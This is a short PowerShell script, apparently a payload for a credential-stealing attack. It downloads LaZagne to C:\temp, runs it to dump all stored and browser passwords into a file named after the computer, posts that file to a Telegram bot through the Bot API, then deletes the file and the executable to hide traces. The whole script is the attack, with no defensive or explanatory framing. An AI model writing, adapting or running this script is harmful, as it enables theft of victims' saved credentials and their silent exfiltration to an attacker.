[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# Download LaZagne and execute it
$Test = "C:\temp"
Start-BitsTransfer -Source "https://example.com" -Destination "$Test/l.exe"
Set-Location $Test
Start-Sleep -Milliseconds 15000
.\l.exe all -vv > "$env:computername.txt"; .\l.exe browsers -vv >> "$env:computername.txt"

# Send the result file to a Telegram bot
# $bt = "bot-token"
# $ci = "chat-id"
$ResultFile = "$Test\$env:computername.txt"

try {
    # Create a byte array from the file
    $FileStream = [System.IO.File]::OpenRead($ResultFile)
    $FileBytes = [byte[]]::new($FileStream.Length)
    $FileStream.Read($FileBytes, 0, $FileBytes.Length)
    $FileStream.Close()

    # Define the boundary for multipart form-data
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"

    # Construct the multipart form-data content
    $BodyLines = @(
        "--$boundary",
        "Content-Disposition: form-data; name=`"chat_id`"",
        "",
        $ci,
        "--$boundary",
        "Content-Disposition: form-data; name=`"document`"; filename=`"$($ResultFile)`"",
        "Content-Type: application/octet-stream",
        "",
        [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($FileBytes),
        "--$boundary--",
        ""
    ) -join $LF

    # Convert the body to a byte array
    $BodyBytes = [System.Text.Encoding]::GetEncoding("iso-8859-1").GetBytes($BodyLines)

    # Send the request to the Telegram API
    $TelegramAPI = "https://api.telegram.org/bot$bt/sendDocument"
    $Response = Invoke-RestMethod -Uri $TelegramAPI -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $BodyBytes

    Write-Host "File sent to Telegram successfully."
} catch {
    Write-Host "Failed to send file to Telegram. Error: $_"
}


# Send the result file
Send-TelegramFile -BotToken $bt -ChatID $ci -FilePath $ResultFile

# Cleanup leftover files
Remove-Item $ResultFile, "$Test/l.exe" -Force -ErrorAction SilentlyContinue

# Exit
Start-Sleep -Milliseconds 2500
exit
